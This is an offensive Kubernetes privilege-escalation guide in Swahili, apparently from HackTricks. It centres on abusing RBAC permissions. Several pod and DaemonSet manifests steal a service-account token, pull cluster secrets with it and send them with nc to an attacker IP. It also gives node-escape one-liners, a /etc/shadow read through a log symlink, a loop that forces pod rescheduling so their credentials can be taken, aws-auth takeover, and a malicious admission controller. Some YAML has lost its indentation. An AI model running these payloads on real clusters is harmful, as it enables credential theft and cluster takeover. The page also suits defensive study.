# Kutumia Majukumu/ClusterRoles katika Kubernetes

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Hapa unaweza kupata mipangilio ya Majukumu na ClusterRoles ambayo inaweza kuwa hatari.\
Kumbuka unaweza kupata rasilimali zote zinazoungwa mkono kwa kutumia `kubectl api-resources`

## **Kupandisha Hadhi**

Kutaja kama sanaa ya kupata **upatikanaji wa mamlaka tofauti** ndani ya kikundi **na mamlaka tofauti** (ndani ya kikundi cha kubernetes au kwenye mawingu ya nje) kuliko zile unazo tayari, katika Kubernetes kuna msingi wa **njia 4 kuu za kupandisha hadhi**:

* Kuwa na uwezo wa **kujifanya** mtumiaji/makundi/SAs wengine wenye mamlaka bora ndani ya kikundi cha kubernetes au kwenye mawingu ya nje
* Kuwa na uwezo wa **kuunda/kusahihisha/kuendesha poda** ambapo unaweza **kupata au kuambatanisha SAs** wenye mamlaka bora ndani ya kikundi cha kubernetes au kwenye mawingu ya nje
* Kuwa na uwezo wa **kusoma siri** kwani vitambulisho vya SAs vinahifadhiwa kama siri
* Kuwa na uwezo wa **kutoroka kwenye node** kutoka kwa kontena, ambapo unaweza kuiba siri zote za kontena zinazoendeshwa kwenye node, vibali vya node, na ruhusa za node ndani ya wingu inayoendeshwa (ikiwapo zipo)
* Njia ya tano inayostahili kutajwa ni uwezo wa **kukimbia port-forward** kwenye poda, kwani unaweza kuwa na uwezo wa kupata rasilimali za kuvutia ndani ya poda hiyo.

### Kupata Rasilimali au Kitendo chochote (Wildcard)

**Wildcard (*) inatoa idhini juu ya rasilimali yoyote na kitendo chochote**. Hutumiwa na wasimamizi. Ndani ya ClusterRole hii inamaanisha kwamba mshambuliaji anaweza kutumia nafasi yoyote katika kikundi
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Pata Upatikanaji wa Rasilimali Yoyote na kitendo maalum

Katika RBAC, idhini fulani zinaleta hatari kubwa:

1. **`create`:** Inatoa uwezo wa kuunda rasilimali yoyote ya kikundi, ikileta hatari ya kupandisha hadhi.
2. **`list`:** Inaruhusu orodha ya rasilimali zote, ikileta hatari ya kuvuja kwa data nyeti.
3. **`get`:** Inaruhusu kupata siri kutoka kwa akaunti za huduma, ikileta tishio la usalama.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Unda - Pora Kitufe

Mshambuliaji mwenye ruhusa ya kuunda podi, anaweza kuambatanisha Akaunti ya Huduma yenye mamlaka ndani ya podi na kudaka kitufe ili kujifanya kuwa Akaunti ya Huduma. Kimsingi kuongeza mamlaka kwake

Mfano wa podi ambayo itaporwa kitufe cha akaunti ya huduma ya `bootstrap-signer` na kutuma kwa mshambuliaji:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Kuunda na Kutoroka Kutoka kwa Podi

Yafuatayo yanabainisha mamlaka yote ambayo chombo kinaweza kuwa nacho:

- **Upatikanaji wa haki za juu** (kulemaza ulinzi na kuweka uwezo)
- **Lemaza majina ya nafasi hostIPC na hostPid** ambayo inaweza kusaidia kuinua mamlaka
- **Lemaza nafasi ya hostNetwork**, ikitoa ufikiaji wa kuiba mamlaka ya wingu la node na ufikiaji bora wa mitandao
- **Imemakinisha / ya mwenyeji ndani ya chombo**
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Unda podi na:
```bash
kubectl --token $token create -f mount_root.yaml
```
Mstari mmoja kutoka [twee hii](https://twitter.com/mauilion/status/1129468485480751104) na pamoja na baadhi ya marekebisho:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sasa unaweza kutoroka kwa mbinu za post-exploitation kwenye node angalia:

#### Kujificha

Labda unataka kuwa **mzito**, kwenye kurasa zifuatazo unaweza kuona unachoweza kupata ufikiaji ikiwa utaunda pod ukiwezesha baadhi ya ruhusa zilizotajwa katika templeti iliyotangulia:

* **Ruhusa + hostPID**
* **Ruhusa pekee**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Unaweza kupata mfano wa jinsi ya kuunda/kutumia mizunguko ya pods iliyopewa ruhusa hapo awali katika_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Kuunda Pod - Hamia kwenye wingu

Ikiwa unaweza **kuunda** podi (na hiari akaunti ya **huduma**) unaweza kuwa na uwezo wa **kupata ruhusa katika mazingira ya wingu** kwa **kupitisha majukumu ya wingu kwa podi au akaunti ya huduma** na kisha kufikia.\
Zaidi ya hayo, ikiwa unaweza kuunda **podi na nafasi ya mtandao wa mwenyeji** unaweza **kuiba jukumu la IAM** la mfano wa **node**.

Kwa maelezo zaidi angalia:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Kuunda/Kurekebisha Upelekaji, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs na Cronjobs**

Inawezekana kutumia vibali hivi kwa **kuunda podi mpya** na kuiba ruhusa kama katika mfano uliotangulia.

Yaml ifuatayo **inaunda daemonset na kuchukua siri ya SA** ndani ya podi:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ni rasilimali katika kubernetes inayotumika kwa **kutekeleza amri katika kikasha ndani ya podi**. Hii inaruhusu **kutekeleza amri ndani ya vyombo au kupata kikasha ndani**.

Hivyo basi, ni **inawezekana kuingia ndani ya podi na kuiba tokeni ya SA**, au kuingia katika podi yenye mamlaka, kutoroka kwenda kwenye node, na kuiba tokeni zote za podi kwenye node na (kutumia vibaya) node:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Hii ruhusa inaruhusu **kuhamisha kituo cha ndani kwa kituo kimoja kwenye pod iliyotajwa**. Hii inalenga kuwezesha kutatua matatizo ya programu zinazoendesha ndani ya pod kwa urahisi, lakini mshambuliaji anaweza kutumia vibaya kupata ufikivu wa programu zenye umuhimu (kama vile DBs) au programu zenye mapungufu (webs?) ndani ya pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Kukarabatiwa Kwa /var/log/ Inayoweza Kuhaririwa

Kama [**inavyoonyeshwa katika utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ikiwa unaweza kupata au kuunda pod na **hosts `/var/log/` directory imewekwa** ndani yake, unaweza **kutoroka kutoka kwenye kontena**.\
Hii ni kimsingi kwa sababu wakati **Kube-API inajaribu kupata logs** ya kontena (kwa kutumia `kubectl logs <pod>`), inaomba faili ya `0.log` ya pod kwa kutumia endpoint ya `/logs/` ya huduma ya **Kubelet**.\
Huduma ya Kubelet inafunua endpoint ya `/logs/` ambayo kimsingi ni **kufunua mfumo wa faili wa `/var/log` wa kontena**.

Hivyo, mshambuliaji mwenye **upatikanaji wa kuandika kwenye folda ya /var/log/** ya kontena anaweza kutumia tabia hizi kwa njia 2:

* Kubadilisha faili ya `0.log` ya kontena yake (kawaida iko katika `/var/logs/pods/namespace_pod_uid/container/0.log`) iwe **symlink inayoashiria `/etc/shadow`** kwa mfano. Kisha, utaweza kuchukua faili ya shadow ya mwenyeji kwa kufanya:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Ikiwa mshambuliaji ana udhibiti wa msingi wowote wenye **ruhusa ya kusoma `nodes/log`**, anaweza tu kuunda **symlink** katika `/host-mounted/var/log/sym` kwenda `/` na wakati wa **kupata `https://<gateway>:10250/logs/sym/` atapata orodha ya mfumo wa mizizi wa mwenyeji** (kubadilisha symlink inaweza kutoa ufikiaji wa faili).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Maabara na shambulizi lililoautomatiki linaweza kupatikana katika** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Kupitisha ulinzi wa readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ikiwa una bahati ya kutosha na uwezo wa uwezo uliopewa sana `CAP_SYS_ADMIN` upo, unaweza tu kurejesha upya folda kama rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Kupitisha ulinzi wa hostPath readOnly <a href="#kupitisha-ulizi-wa-hostpath-readonly" id="kupitisha-ulizi-wa-hostpath-readonly"></a>

Kama ilivyoelezwa katika [**utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) niwezekanavyo kupitisha ulinzi:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ambayo ilikuwa inalenga kuzuia kutoroka kama zile za awali kwa badala ya kutumia ujumuishaji wa hostPath, tumia PersistentVolume na PersistentVolumeClaim kuunganisha folda za mwenyeji kwenye chombo na ufikiaji wa kuandika:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Kujifanya kuwa akaunti zenye mamlaka**

Kwa [**ujifanya kuwa mtumiaji**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) mwenye mamlaka, mshambuliaji anaweza kujifanya kuwa akaunti yenye mamlaka.

Tumia parameter `--as=<jina la mtumiaji>` katika amri ya `kubectl` kujifanya kuwa mtumiaji, au `--as-group=<kundi>` kujifanya kuwa kundi:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Au tumia REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kupata Siri

Ruhusa ya **kupata siri inaweza kuruhusu mshambuliaji kusoma siri hizo** kwa kufikia kipengele cha REST API:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kusoma siri - kufanya nguvu kwa token IDs

Wakati mshambuliaji mwenye kitambulisho chenye ruhusa ya kusoma anahitaji jina sahihi la siri kutumia, tofauti na ruhusa pana ya _**kutaja siri**_, bado kuna udhaifu. Akaunti za huduma za msingi katika mfumo zinaweza kuhesabiwa, kila moja ikihusishwa na siri. Siri hizi zina muundo wa jina: kipimo cha msingi kifuatiwacho na token ya herufi tano za alphanumeric za kubahatisha (isipokuwa herufi fulani) kulingana na [michocheo](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token hupatikana kutoka kwa seti iliyopunguzwa ya herufi 27 (`bcdfghjklmnpqrstvwxz2456789`), badala ya safu kamili ya alphanumeric. Kikomo hiki hupunguza jumla ya mchanganyiko uwezekanao hadi 14,348,907 (27^5). Kwa hivyo, mshambuliaji anaweza kutekeleza shambulio la nguvu kwa urahisi kudhani token katika masaa machache, ikisababisha uwezekano wa kupanda hadhi kwa kupata akaunti nyeti za huduma.

### Maombi ya Kusaini Cheti

Ikiwa una vitenzi **`umba`** katika rasilimali `certificatesigningrequests` (au angalau katika `certificatesigningrequests/nodeClient`). Unaweza **kuunda** CeSR mpya ya **nodi mpya**.

Kulingana na [nyaraka inawezekana kuidhinisha maombi haya moja kwa moja](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), hivyo katika kesi hiyo **hauitaji ruhusa ziada**. Vinginevyo, unahitaji kuweza kuidhinisha ombi, ambalo linamaanisha kusasisha katika `certificatesigningrequests/approval` na `idhinisha` katika `signers` na jina la rasilimali `<signerNameDomain>/<signerNamePath>` au `<signerNameDomain>/*`

**Mfano wa jukumu** lenye ruhusa zote zinazohitajika ni:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Kwa hivyo, na CSR mpya ya node ikiridhishwa, unaweza **kutumia vibaya** ruhusa maalum za nodes ili **kuiba siri** na **kupandisha viwango vya ruhusa**.

Katika [**chapisho hili**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) na [**hili lingine**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) usanidi wa GKE K8s TLS Bootstrap umesanidiwa na **kuidhinisha moja kwa moja** na kutumika kuzalisha sifa za Node mpya ya K8s na kisha kutumia hizo kwa kupandisha viwango vya ruhusa kwa kuiba siri.\
Ikiwa **una ruhusa zilizotajwa unaweza kufanya kitu kama hicho**. Tafadhali kumbuka kuwa mfano wa kwanza unapuuza kosa linalozuia node mpya kupata siri ndani ya vyombo kwa sababu **node inaweza tu kupata siri za vyombo vilivyowekwa kwenye node hiyo.**

Njia ya kuzidi hili ni tu **kuunda sifa za node kwa jina la node ambapo chombo chenye siri za kuvutia kimeunganishwa** ( lakini angalia jinsi ya kufanya hivyo katika chapisho la kwanza):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Wahusika wanaoweza kuhariri **`configmaps`** katika eneo la kube-system kwenye mizizi ya EKS (inahitaji kuwa kwenye AWS) wanaweza kupata mamlaka ya msimamizi wa mizizi kwa kubadilisha configmap ya **aws-auth**.\
Vibambo vinavyohitajika ni **`update`** na **`patch`**, au **`create`** ikiwa configmap haikuundwa:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Unaweza kutumia **`aws-auth`** kwa **uthabiti** kumpa mtumiaji kutoka **akaunti nyingine**.

Hata hivyo, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **haitafanya kazi kutoka kwenye akaunti tofauti**. Lakini kwa kweli `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` inafanya kazi ikiwa utaweka ARN ya kikundi badala ya jina tu.\
Ili kufanya `kubectl` ifanye kazi, hakikisha **umeweka vipimo vya kubeconfig vya waathiriwa** na katika vigezo vya aws exec ongeza `--profile other_account_role` ili kubectl itumie wasifu wa akaunti nyingine kupata token na kuwasiliana na AWS.
{% endhint %}

### Kuongeza Mamlaka katika GKE

Kuna **njia 2 za kutoa ruhusa za K8s kwa mawakala wa GCP**. Katika kila kesi, mawakala pia wanahitaji ruhusa ya **`container.clusters.get`** ili waweze kukusanya vibali vya kupata kikundi, au utahitaji **kuunda faili yako ya kikundi ya kubectl** (fuata kiungo kifuatacho).

{% hint style="warning" %}
Unapozungumza na kifaa cha api cha K8s, **kitambulisho cha GCP kitatumwa**. Kisha, GCP, kupitia kifaa cha api cha K8s, kwanza itaangalia ikiwa kifaa cha msingi (kwa barua pepe) **ina ufikiaji wowote ndani ya kikundi**, kisha itaangalia ikiwa ina **ufikiaji wowote kupitia GCP IAM**.\
Ikiwa **mojawapo** ya hizo ni **kweli**, atajibiwa. Ikiwa **sivyo** kosa linalopendekeza kutoa **ruhusa kupitia GCP IAM** litatolewa.
{% endhint %}

Kisha, njia ya kwanza ni kutumia **GCP IAM**, ruhusa za K8s zina **ruhusa sawa za GCP IAM**, na ikiwa kifaa cha msingi kina, itaweza kutumia.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Njia ya pili ni **kutoa ruhusa za K8s ndani ya kikundi** kwa kutambua mtumiaji kwa **barua pepe** yake (akaunti za huduma za GCP pamoja).

### Unda kitambulisho cha huduma za kikundi

Mawakala wanaoweza **kuunda Ombi la Vitambulisho** (`serviceaccounts/token`) Wanapozungumza na kifaa cha api cha K8s SAs (habari kutoka [**hapa**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Mawakala wanaoweza **`kuboresha`** au **`kusahihisha`** **`pods/ephemeralcontainers`** wanaweza kupata **utekelezaji wa nambari kwenye podi zingine**, na kwa uwezekano **kuvunja** kwenye nodi yao kwa kuongeza chombo cha muda mfupi na muktadha wa usalama ulioidhinishwa

### ValidatingWebhookConfigurations au MutatingWebhookConfigurations

Mawakala wenye vitenzi vyovyote vya `umba`, `kuboresha` au `sahihisha` juu ya `validatingwebhookconfigurations` au `mutatingwebhookconfigurations` wanaweza kuwa na uwezo wa **kuunda moja ya webhookconfigurations** ili kuweza **kuongeza mamlaka**.

Kwa mfano wa [`mutatingwebhookconfigurations` angalia sehemu hii ya chapisho hili](./#malicious-admission-controller).

### Kuongeza

Kama unavyoweza kusoma katika sehemu ifuatayo: [**Kuzuia Kuongezeka kwa Mamlaka Imejengwa**](./#built-in-privileged-escalation-prevention), kifaa cha msingi hawezi kusasisha wala kuunda majukumu au majukumu ya kikundi bila kuwa na vibali vipya. Isipokuwa ikiwa ana **vitendo `kuongeza`** juu ya **`majukumu`** au **`majukumu ya kikundi`.**\
Kisha anaweza kusasisha/kujenga majukumu mapya, majukumu ya kikundi na vibali bora kuliko vile alivyo navyo.

### Nodi za proksi

Mawakala wenye ufikiaji wa **`nodes/proxy`** subresource wanaweza **kutekeleza nambari kwenye podi** kupitia API ya Kubelet (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Taarifa zaidi kuhusu uthibitishaji wa Kubelet katika ukurasa huu:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Unayo mfano wa jinsi ya kupata [**RCE ukiwa umehakikiwa kwenye API ya Kubelet hapa**](../pentesting-kubernetes-services.md#kubelet-rce).

### Futa podi + nodi zisizoweza kuhesabiwa

Mawakala wanaoweza **kufuta podi** (`futa` vitendo juu ya rasilimali ya `pods`), au **kufukuza podi** (`umba` vitendo juu ya rasilimali ya `pods/eviction`), au **badilisha hali ya podi** (ufikiaji wa `pods/status`) na wanaweza **kufanya nodi zingine zisizoweza kuhesabiwa** (ufikiaji wa `nodes/status`) au **kufuta nodi** (`futa` vitendo juu ya rasilimali ya `nodes`) na wana udhibiti juu ya podi, wanaweza **kuiba podi kutoka kwenye nodi zingine** ili ziwe **zinatekelezwa** kwenye **nodi iliyoharibiwa** na mshambuliaji anaweza **kuiba vibali** kutoka kwa podi hizo.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Hali ya Huduma (CVE-2020-8554)

Wahusika wanaoweza **kurekebisha** **`huduma/hali`** wanaweza kuweka uga wa `status.loadBalancer.ingress.ip` kutumia **CVE-2020-8554 isiyosahihishwa** na kuanzisha mashambulizi ya **MiTM dhidi ya kikundi**. Hatua nyingi za kuzui CVE-2020-8554 zinazuia huduma za ExternalIP tu (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Hali za Nodes na Pods

Wahusika wenye ruhusa za **`sasisha`** au **`patch`** juu ya `nodes/hali` au `pods/hali`, wanaweza kurekebisha lebo ili kuathiri vikwazo vya upangaji vinavyotekelezwa.

## Kuzuia Kupandishwa kwa Mamlaka Kujengwa Ndani

Kubernetes ina [mfumo uliojengwa](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) wa kuzuia kupandishwa kwa mamlaka.

Mfumo huu huhakikisha kwamba **watumiaji hawawezi kuinua mamlaka yao kwa kurekebisha majukumu au kufunga majukumu**. Utekelezaji wa sheria hii hufanyika kwenye kiwango cha API, kutoa kinga hata wakati msanidi wa RBAC hajafanya kazi.

Sheria inabainisha kwamba **mtumiaji anaweza tu kuunda au kusasisha jukumu ikiwa anamiliki ruhusa zote zinazojumuisha jukumu hilo**. Zaidi ya hayo, wigo wa ruhusa za sasa za mtumiaji lazima lingane na ile ya jukumu analojaribu kuunda au kurekebisha: au kwa kiwango cha kikundi kwa ClusterRoles au imefungwa kwa jina la uga huo huo (au kwa kiwango cha kikundi) kwa Majukumu.

{% hint style="warning" %}
Kuna ubaguzi kwa sheria iliyotangulia. Ikiwa msingi ana **kitenzi `pandisha`** juu ya **`majukumu`** au **`majukumu ya kikundi`** anaweza kuongeza mamlaka ya majukumu na majukumu ya kikundi hata bila kuwa na ruhusa mwenyewe.
{% endhint %}

### **Pata & Sasisha RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Inavyoonekana hii mbinu ilifanya kazi hapo awali, lakini kulingana na majaribio yangu haifanyi kazi tena kwa sababu ile ile iliyoelezwa katika sehemu iliyotangulia. Huwezi kuunda/kurekebisha jukumu la kufunga ili kujipa wewe mwenyewe au SA tofauti baadhi ya ruhusa ikiwa huna tayari.**
{% endhint %}

Ruhusa ya kuunda Rolebindings inaruhusu mtumiaji **kufunga majukumu kwa akaunti ya huduma**. Ruhusa hii inaweza kusababisha kupandishwa kwa mamlaka kwa sababu **inaruhusu mtumiaji kufunga ruhusa za msimamizi kwa akaunti ya huduma iliyoharibiwa.**

## Mashambulizi Mengine

### Programu ya Proksi ya Sidecar

Kwa chaguo-msingi hakuna usimbaji katika mawasiliano kati ya makodsi. Uthibitisho wa pande zote, podi hadi podi.

#### Unda programu ya proksi ya sidecar <a href="#unda-programu-ya-proksi-ya-sidecar" id="unda-programu-ya-proksi-ya-sidecar"></a>

Unda faili yako .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Hariri faili yako .yaml na ongeza mistari isiyokuwa imefafanuliwa:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Angalia kumbukumbu za proksi:
```bash
kubectl logs app -C proxy
```
Maelezo zaidi kwenye: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Msimamizi wa Udhibiti wa Kuingilia kati wa Nia Mbaya

Msimamizi wa kuingilia kati wa nia mbaya **hukamata maombi kwa seva ya API ya Kubernetes** kabla ya kudumu kwa kitu, lakini **baada ya ombi kuthibitishwa** **na kuruhusiwa**.

Ikiwa mshambuliaji kwa namna fulani anafanikiwa **kuingiza Msimamizi wa Kuingilia kati wa Kugeuza**, ataweza **kurekebisha maombi yaliyothibitishwa tayari**. Kuwa na uwezo wa kuboresha hali ya mamlaka, na mara nyingi kudumu kwenye kikundi.

**Mfano kutoka [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Angalia hali ili uone ikiwa iko tayari:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

